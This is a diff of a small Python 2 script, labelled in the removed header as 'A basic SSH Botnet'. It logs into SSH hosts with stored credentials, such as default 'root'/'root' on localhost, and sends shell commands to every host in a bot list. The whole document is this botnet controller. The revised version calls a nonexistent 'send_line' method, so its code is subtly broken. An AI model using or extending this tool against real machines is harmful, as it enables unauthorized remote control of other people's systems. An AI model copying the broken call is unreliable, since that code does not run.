@@ -1,47 +1,44 @@
-"""
-    Author: Iem-Prog
-    Date: 21-09-2017
-    Description: A basic SSH Botnet
-"""
+#/usr/bin/env python2.7
 
 import pxssh
 
-class Client:
-
-    def __init__(self, host, user, password):
+class Client():
+    def __init__(self, host, user, passwd):
         self.host = host
         self.user = user
-        self.password = password
+        self.passwd = passwd
         self.session = self.connect()
 
+    #A method to establish a connection
     def connect(self):
         try:
             s = pxssh.pxssh()
-            s.login(self.host, self.user, self.password)
+            s.login(self.host, self.user, self.passwd)
             return s
         except Exception as e:
             print(e)
-            print('[-] Error Connecting')
+            print("Connection error occured! try again.")
 
-    def send_command(self, cmd):
-        self.session.sendline(cmd)
+    # A method to send commands
+    def send_cmd(self, cmd):
+        self.session.send_line(cmd)
         self.session.prompt()
         return self.session.before
 
+def BotNetCmd(cmd):
+    for client in Clients:
+        output = client.send_cmd(cmd)
+        print("-Host:[" + client.host + "]")
+        print("[Output]:" + output)
 
-def botnetCommand(command):
-    for client in botNet:
-        output = client.send_command(command)
-        print('[*] Output from ' + client.host)
-        print('[+] ' + output)
+# A method to add client
+def addClient(host, user, passwd):
+    client = Client(host, user, passwd)
+    Clients.append(client)
 
+Clients = []
+default_user = ["127.0.0.1", "root", "root"]
+addClient(default_user[0], default_user[1], default_user[2])
 
-def addClient(host, user, password):
-    client = Client(host, user, password)
-    botNet.append(client)
-
-botNet = []
-addClient('127.0.0.1', 'ubuntu', 'ubuntu')
-
-botnetCommand('uname -v')
-botnetCommand('ls -la')
+BotNetCmd("pwd")
+BotNetCmd("ls -la")
